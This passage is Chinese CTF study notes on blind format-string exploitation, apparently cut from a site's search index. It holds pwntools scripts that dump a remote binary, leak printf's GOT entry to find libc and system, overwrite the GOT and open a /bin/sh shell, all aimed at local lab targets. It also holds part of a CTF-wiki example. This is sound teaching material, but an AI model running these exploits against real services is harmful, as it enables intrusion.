\u4e0b\u9762\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u6cc4\u9732\u811a\u672c\uff0c\u7ed3\u5408\u6ce8\u89e3\u5206\u6790\u5982\u4f55\u5904\u7406\u4e0a\u9762\u63d0\u5230\u7684\u95ee\u9898\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin','wb') as f: f.write(text_seg) \u6ce8\u89e3 \uff1a 19-21 \u884c\uff1a\u5904\u7406\u65e0\u5173\u6cc4\u9732\u7684\u7a0b\u5e8f\u6d41\u7a0b\u540e\uff0c\u8fdb\u5165\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8f93\u5165\u72b6\u6001 24 \u884c\uff1a32 \u4f4d\u7cfb\u7edf\u52a0\u8f7d\u5730\u5740 9 \u884c\uff1a\"%9$s.TMP\" \u4e2d\u7684 .TMP \u65e2\u662f\u586b\u5145\u5bf9\u9f50\uff0c\u4e5f\u662f\u5206\u9694\u7b26\uff0c\u65b9\u4fbf\u540e\u9762\u5904\u7406\u6570\u636e 14 \u884c\uff1a\u4f7f\u7528binascii \u5c06\u6cc4\u6f0f\u51fa\u6765\u5b57\u7b26\u4e32\u6bcf\u4e00\u4e2a\u90fd\u4ece ascii \u8f6c\u6362\u4e3a \u5341\u516d\u8fdb\u5236\uff0c\u65b9\u4fbf\u663e\u793a 15 \u884c\uff1ar.recvrepeat(0.2) \u63a5\u53d7\u8fd4\u56de\u7684\u5783\u573e\u6570\u636e\uff0c\u65b9\u4fbf\u4e0b\u4e00\u8f6e\u7684\u8f93\u5165 30 \u884c\uff1a\u6cc4\u6f0f\u5730\u5740\u52a8\u6001\u589e\u52a0\uff0c\u5047\u5982\u6cc4\u6f0f 1 \u5b57\u8282\u5c31\u589e\u52a0 1 \uff1b\u6cc4\u6f0f 3 \u5b57\u8282\u5c31\u589e\u52a0 3 31-33 \u884c\uff1a\u5904\u7406\u6cc4\u6f0f\u957f\u5ea6\u4e3a 0 \uff0c\u4e5f\u5c31\u662f\u6570\u636e\u662f \\x00 \u7684\u60c5\u51b5\u3002\u5730\u5740\u589e\u52a0 1 \uff0c\u7a0b\u5e8f\u6570\u636e\u52a0 \\x00 \u8fd0\u884c\u4e4b\u540e\uff0c\u8010\u5fc3\u7b49\u5f85\u6cc4\u6f0f\u5b8c\u6210\u3002\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\u662f\u4e0d\u80fd\u8fd0\u884c\u7684\uff0c\u4f46\u53ef\u4ee5\u5728 ida \u8fdb\u8fc7\u5904\u7406\u53ef\u4ee5\u8fdb\u884c\u5206\u6790\u3001\u627e plt \u3001got.plt \u7b49\u3002 \u5c06\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048000 \uff08\u5f00\u59cb\u6cc4\u9732\u7684\u5730\u5740\uff09\uff1a \u53ef\u4ee5\u901a\u8fc7 shift+F12 \u67e5\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u7136\u540e\u76f4\u63a5 F5 \u53cd\u7f16\u8bd1\uff1a \u57fa\u672c\u7ed3\u6784\u5df2\u7ecf\u51fa\u6765\u4e86\uff0c\u76f2\u6253\u6ca1\u6709\u6e90\u4ee3\u7801\uff0c\u5c31\u9700\u8981\u6839\u636e\u4f20\u5165\u53c2\u6570\u53bb\u5224\u65ad\u54ea\u4e2a sub_xxx \u662f\u54ea\u4e2a\u51fd\u6570\u4e86\u3002\u6bd4\u5982\u8f93\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684 sub_8048490 \u5c31\u662f printf \u3002","title":"\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb"},{"location":"fmtstr/Bilnd_Pwn/#text","text":"\u7a0b\u5e8f\u542f\u52a8\u8fc7\u7a0b\uff1a \u4ece _start \u51fd\u6570\u5f00\u59cb\u5c31\u662f .text \u6bb5\uff0c\u53ef\u4ee5\u5728 ida \u4e2d\u6253\u5f00\u4e00\u4e2a\u6b63\u5e38\u7684 binary \u89c2\u5bdf text \u6bb5\u5f00\u5934\u7b2c\u4e00\u4e2a\u51fd\u6570\u5c31\u662f _stat \uff1a\uff08\u56fe\u4e3a 32 \u4f4d\u7a0b\u5e8f\uff09 \u5148\u7528 %p \u6cc4\u9732\u51fa\u6808\u4e0a\u6570\u636e\uff0c\u627e\u5230\u4e24\u4e2a\u76f8\u540c\u5730\u5740\uff0c\u800c\u4e14\u8fd9\u4e2a\u5730\u5740\u5f88\u9760\u8fd1\u7a0b\u5e8f\u52a0\u8f7d\u521d\u5730\u5740\uff0832\u4f4d\uff1a0x8048000\uff1b64\u4f4d\uff1a0x400000\uff09\u3002\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import sys p = remote('127.0.0.1',10001) p.recv() p.sendline('nameaaa') p.recv() def where_is_start(ret_index=null): return_addr=0 for i in range(400): payload = '%%%d$p.TMP' % (i) p.sendline(payload) p.recvuntil('right:') val = p.recvuntil('.TMP') log.info(str(i*4)+' '+val.strip().ljust(10)) if(i*4==ret_index): return_addr=int(val.strip('.TMP').ljust(10)[2:],16) return return_addr p.recvrepeat(0.2) start_addr=where_is_start() \u6700\u540e\u5728\u504f\u79fb 1164 \u548c 1188 \u627e\u5230 text \u6bb5\u5730\u5740 0x8048510 \uff0c\u53ef\u4ee5\u5bf9\u6bd4\u4e0a\u56fe\uff0c\u4e0a\u56fe\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u622a\u56fe\uff1a \u6cc4\u9732\u811a\u672c\u548c\u524d\u9762\u4e00\u6837\u53ea\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u8d77\u59cb\u5730\u5740\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048510 #begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_text','wb') as f: f.write(text_seg) \u5c06\u6cc4\u9732\u6587\u4ef6\u653e\u5165 ida \u5206\u6790\uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048510 \uff08\u5f00\u59cb\u6cc4\u9732\u5730\u5740\uff09\uff1a \u627e\u5230 main \u51fd\u6570\u5728 0x0804860B \uff0c\u9700\u8981\u5c06\u8fd9\u90e8\u5206\u5b9a\u4e49\u4e3a\u51fd\u6570\u624d\u80fd\u53cd\u7f16\u8bd1\uff0c\u53f3\u952e\u5730\u5740\u9694\u58c1\u7684\u540d\u79f0 loc_804860B \uff0ccreat function \u3002 \u7ea2\u8272\u90e8\u5206\u5c31\u662f\u6ca1\u6709\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\uff0c\u540e\u9762\u8ddf\u7684\u5c31\u662f\u51fd\u6570 plt \u5730\u5740\u3002 \u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4e0d\u540c\uff0c\u7ed3\u5408\u5b9e\u9645\u4f7f\u7528\u3002","title":"\u4ece .text \u6bb5\u5f00\u59cb"},{"location":"fmtstr/Bilnd_Pwn/#_8","text":"\u7740\u91cd\u8bb0\u5f55 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \uff0c\u4e0d\u4e00\u6b65\u4e00\u6b65\u5206\u6790\u8fd9\u9053\u9898\u76ee\u6f0f\u6d1e\uff08\u8be6\u7ec6\u5206\u6790\uff1a \u9ed8\u5c0f\u897f \u535a\u5ba2\uff09\u3002\u8fd9\u9053\u9898\u76ee\u601d\u8def\u662f\uff1a \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u901a\u8fc7\u6cc4\u9732 plt \u8868\u4e2d\u7684\u6307\u4ee4\u5185\u5bb9\u786e\u5b9a\u5bf9\u5e94\u7684 got.plt \u8868\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 got.plt \u8868\u5730\u5740\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 printf \u7684\u51fd\u6570\u5730\u5740\u786e\u5b9a libc \u57fa\u5740\uff0c\u4ece\u800c\u83b7\u5f97 system \u5730\u5740 \u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4efb\u610f\u5199\u529f\u80fd\u5c06 printf \u7684 got.plt \u8868\u4e2d\u7684\u5730\u5740\u4fee\u6539\u4e3a system \u7684\u5730\u5740 send \u5b57\u7b26\u4e32 \u201c/bin/sh\u201d \uff0c\u90a3\u4e48\u5728\u8c03\u7528 printf(\u201c/bin/sh\u201d) \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(\u201c/bin/sh;\u201d) \uff0c\u4ece\u800c\u6210\u529f\u83b7\u53d6shell","title":"\u89e3\u9898\u6d41\u7a0b"},{"location":"fmtstr/Bilnd_Pwn/#printf-plt","text":"\u5c06\u6cc4\u9732\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \u4e2d\u5206\u6790\u83b7\u5f97\uff0c\u51fd\u6570\u540d\u540e\u534a\u622a\u5c31\u662f\u5730\u5740 0x8048490 \uff1a","title":"\u786e\u5b9a printf \u7684 plt \u5730\u5740"},{"location":"fmtstr/Bilnd_Pwn/#gotplt","text":"\u548c\u6cc4\u9732\u7a0b\u5e8f payload \u9ad8\u5ea6\u76f8\u4f3c\uff1a payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) \u6ce8\u89e3\uff1a \u4e3a\u4ec0\u4e48\u63a5\u6536 'right:\\xff\\x25' \uff1f right: \u662f\u56fa\u5b9a\u56de\u663e\uff0c\\xff\\x25 \u662f\u65e0\u7528\u5b57\u8282\u7801\u3002\u5b9e\u9645\u4e0a 0x8048490 \u7684\u6c47\u7f16\u662f\u8fd9\u6837\u7684\uff1a pwndbg> pdisass 0x8048490 \u25ba 0x8048490 <printf@plt> jmp dword ptr [0x804a018] <0xf7e4d670> 0x8048496 <printf@plt+6> push 0x18 0x804849b <printf@plt+11> jmp 0x8048450 # \u5b57\u8282\u7801 pwndbg> x /20wx 0x8048490 0x8048490 <printf@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048490 \u6307\u5411\u662f\u4e00\u6761\u8df3\u8f6c got.plt \u6307\u4ee4\uff0c\u6211\u4eec\u9700\u8981\u5176\u4e2d\u8df3\u8f6c\u7684\u76ee\u6807\u5730\u5740\u3002\\xff\\x25 \u5c31\u662f\u8df3\u8f6c\u6307\u4ee4\u7684\u5b57\u8282\u7801\uff0c\u6211\u4eec\u5c31\u8981\u5148\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff0c\u7136\u540e\u518d\u63a5\u6536 4 \u5b57\u8282\u7684 got.plt \u5730\u5740\u3002","title":"\u6cc4\u9732 got.plt"},{"location":"fmtstr/Bilnd_Pwn/#printf","text":"\u6784\u9020\u65b9\u6cd5\u540c\u4e0a\uff0c\u4f46\u4e0d\u9700\u8981\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff1a payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4))","title":"\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740"},{"location":"fmtstr/Bilnd_Pwn/#libc-system","text":"\u9898\u76ee\u6ca1\u6709\u7ed9\u51fa libc \u3002\u4ece\u6cc4\u9732\u51fa\u6765\u7684 printf@got \u53bb libcdatabase \u67e5\u8be2\u5176\u4ed6\u51fd\u6570\u504f\u79fb\u3002 printf:0x00049670 system:0x0003ada0","title":"\u6cc4\u9732 libc \u57fa\u5740&amp; system \u5730\u5740"},{"location":"fmtstr/Bilnd_Pwn/#printfgotplt","text":"payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload)","title":"\u4efb\u610f\u5199\u4fee\u6539 printf@got.plt"},{"location":"fmtstr/Bilnd_Pwn/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x8048490 # name p.recv() p.sendline('nameaaa') p.recv() # leak printf@got.plt payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) log.info(\"printf_got_plt:\"+hex(printf_got_plt)) # leak printf@got payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4)) log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x00049670 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x0003ada0 log.info(\"system_addr:\"+hex(system_addr)) # overwrite payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload) p.sendline('/bin/sh\\x00') p.interactive()","title":"exp"},{"location":"fmtstr/Bilnd_Pwn/#64","text":"","title":"64 \u4f4d\u5229\u7528\u624b\u6cd5"},{"location":"fmtstr/Bilnd_Pwn/#_9","text":"\u8fd8\u662f\u4f7f\u7528 32 \u4f4d\u7684\u4f8b\u9898\u6e90\u7801\uff0c\u7f16\u8bd1 64 \u4f4d\u7a0b\u5e8f\uff1a gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10000,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10000) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u3002","title":"\u5b9e\u9a8c\u73af\u5883\u51c6\u5907"},{"location":"fmtstr/Bilnd_Pwn/#_10","text":"\u586b\u5145 8 \u5b57\u8282\uff0c\u7136\u540e\u518d\u586b\u5165 %p \uff0c\u56de\u663e\u957f\u5ea6\u662f 8 \u5b57\u8282\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570"},{"location":"fmtstr/Bilnd_Pwn/#_11","text":"\u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 8 \u3002","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb"},{"location":"fmtstr/Bilnd_Pwn/#dump_1","text":"\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff0c\u6216\u8005\u4ece text \u6bb5\u5f00\u59cb\u53ef\u4ee5\u7684\u3002\u8fd9\u91cc\u4e0d\u518d\u627e text \u6bb5\u8d77\u59cb\u4f4d\u7f6e\uff0c\u76f4\u63a5\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\u6cc4\u9732\u3002\u4e24\u4e2a\u4f4d\u6570\u7a0b\u5e8f\u811a\u672c\u901a\u7528\u7684\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\u3002 64 \u4f4d\u7a0b\u5e8f\u52a0\u8f7d\u8d77\u59cb\u5730\u5740\u662f\uff1a0x400000 \uff0c\u4e0b\u9762\u662f\u5bf9\u6bd4\u56fe\uff1a \u811a\u672c\u8fd8\u662f\u90a3\u4e2a\u811a\u672c\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' #r = remote('127.0.0.1',10001) r = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('moxiaoxi') r.recv() # leak begin = 0x400000#0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_64','wb') as f: f.write(text_seg) ida \u52a0\u8f7d\u53c2\u6570\u5982\u56fe\uff1a \u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u8fd9\u91cc\u6ca1\u6709\u8bc6\u522b\u4e3a\u51fd\u6570\uff0c\u9700\u8981\u624b\u52a8\u521b\u5efa\u51fd\u6570\u3002\u5728 0x0400826 \u53f3\u952e creat function \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u53cd\u6c47\u7f16\u4e86\u3002 \u70b9\u8fdb printf@plt \uff0c\u91cc\u9762\u662f\u8df3\u8f6c\u5230 printf@got.plt \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u4ece ida \u77e5\u9053\u4e86\uff1a printf_plt = 0x4006B0 printf_got_plt = 0x601030 \u89e3\u9898\u601d\u8def\u4e0e 32 \u4f4d\u4e00\u81f4\uff0c\u5229\u7528\u811a\u672c\uff1a #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_64_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x4006B0 printf_got_plt = 0x601030 # name p.recv() p.sendline('moxiaoxi') p.recv() # leak printf@got payload = \"%9$s.TMP\" + p64(printf_got_plt+1) p.sendline(payload) p.recvuntil('right:') printf_got = u64(p.recv(5).ljust(7,'\\x00')+'\\x00')<<8 log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x055800 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x045390 log.info(\"system_addr:\"+hex(system_addr)) one = p64(system_addr)[:2] two = p64(system_addr>>16)[:2] payload = \"%9104c%12$hn%54293c%13$hn\" + 'a'*7 payload += p64(printf_got_plt) + p64(printf_got_plt+2) p.sendline(payload) p.recv() p.sendline('/bin/sh\\x00') p.interactive()","title":"dump \u7a0b\u5e8f"},{"location":"fmtstr/Bilnd_Pwn/#_12","text":"axb_2019_fmt32 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee axb_2019_fmt64 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee SuCTF2018 - lock2 \u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2","title":"\u66f4\u591a\u5b9e\u4f8b"},{"location":"fmtstr/Bilnd_Pwn/#_13","text":"ctf-wiki leak me pwn-\u76f2\u6253","title":"\u53c2\u8003"},{"location":"fmtstr/fmtstr_example/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50 \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 64 \u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u539f\u7406 \u5176\u5b9e 64 \u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c 32 \u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc7 64 \u4f4d\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f \u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002 \u4f8b\u5b50 \u786e\u5b9a\u4fdd\u62a4 \u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2017 \u5e74\u7684 UIUCTF \u4e2d pwn200 GoodLuck \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2a flag.txt \u6587\u4ef6\u3002 \u279c 2017-UIUCTF-pwn200-GoodLuck git:(master) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86 Canary\u3001NX \u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206 RELRO \u4fdd\u62a4\u3002 \u5206\u6790\u7a0b\u5e8f \u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0; j <= 21; ++j ) { v5 = format[j]; if ( !v5 || v11[j] != v5 ) { puts(\"You answered:\"); printf(format); puts(\"\\nBut that was totally wrong lol get rekt\"); fflush(_bss_start); result = 0; goto LABEL_11; } } \u53ef\u4ee5\u770b\u5230 flag \u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a 5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a 4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d 6 \u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt \u5b57\u7b26\u4e32\u5b58\u50a8\u5728 RDI \u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5 fmt \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a 10\u3002\u800c fmt \u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684 order \u4e3a fmt \u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230 flag \u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528 https://github.com/scwuaptx/Pwngdb \u4e2d\u7684 fmtarg \u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987b break \u5728 printf \u5904\u3002 \u6765\u81ea resery \u5e08\u5085\u6ce8\u89e3\uff1a \u8fd9\u91cc\u7684 10 \u662f\u7531 5+5 \u5f97\u5230\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e24\u4e2a 5 \u662f\u4ece\u54ea\u91cc\u7684\u5f97\u5230\u7684\uff0c\u6211\u6765\u89e3\u91ca\u4e00\u4e0b\uff0c\u524d\u9762\u7684 5\uff1a\u7531\u4e8e 64 \u4e3a\u7a0b\u5e8f\uff0c\u524d 64 \u4e2a\u53c2\u6570\u662f\u5b58\u5728\u5bc4\u5b58\u5668\u4e2d\u7684\uff0c\u5206\u522b\u662f rdi\uff0crsi\uff0crcx\uff0crdx\uff0cr8\uff0cr9\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u50a8\u5728 rdi \u4e2d\u7684\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u504f\u79fb\u5c31\u5e94\u8be5\u662f 5+flag \u5728\u6808\u4e2d\u7684\u504f\u79fb\uff0c\u5728\u6808\u4e2d\u7684\u504f\u79fb\u5c31\u5f88\u597d\u7406\u89e3\u4e86\u5c31\u662f 5\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 10 \u6ce8\u89e3 \u6211\u5b89\u88c5\u7684 Pwndbg \u5e76\u6ca1\u6709 fmtarg \uff0c\u53ef\u80fd\u662f\u7248\u672c\u4e0d\u5bf9\uff0c\u5982\u679c\u9700\u8981\u5b89\u88c5\u4e00\u4e0b gef \u63d2\u4ef6\u3002 \u4e24\u4e2a\u4f5c\u8005\u90fd\u89e3\u91ca\u4e86\u504f\u79fb 10 \u662f\u600e\u4e48\u8ba1\u7b97\u6765\uff0c\u4f46\u6211\u66f4\u559c\u6b22\u7684\u65b9\u6cd5\u662f \u8f93\u5165\u4e00\u957f\u4e32 %p \u5f97\u51fa\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u76ee\u6807\u504f\u79fb\u6216\u5730\u5740 \u3002 shell $ ./goodluck what's the flag bbbbbbbb%p%p%p%p%p%p%p%p%p%p%p You answered: bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161 But that was totally wrong lol get rekt 0x602830 \u662f\u7b2c 7 \u4f4d\u3002\u4e3a\u4ec0\u4e48\u6cc4\u9732\u7684\u4e0d\u662f 0x6262626262626262 \uff1f\u524d\u9762\u63d0\u5230\u4e86\uff0c64 \u4f4d\u7cfb\u7edf\u7684\u524d\u516d\u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\u7684\uff0c\u800c bbbbbbbb \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u81ea\u7136\u5728\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\uff0c0x602830 \u5c31\u662f\u5b58\u50a8\u7684\u5bc4\u5b58\u5668\u5730\u5740\u3002\u600e\u4e48\u83b7\u5f97\u8fd9\u4e2a\u5730\u5740\uff1fgdb \u8c03\u8bd5\u65ad\u70b9\u6253\u5728 printf \u51fd\u6570\uff1a \u8fd9\u6837\u5f97\u51fa\u6700\u540e\u7684 flag \u504f\u79fb\u4e3a 10 \u3002 \u5229\u7528\u7a0b\u5e8f #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # 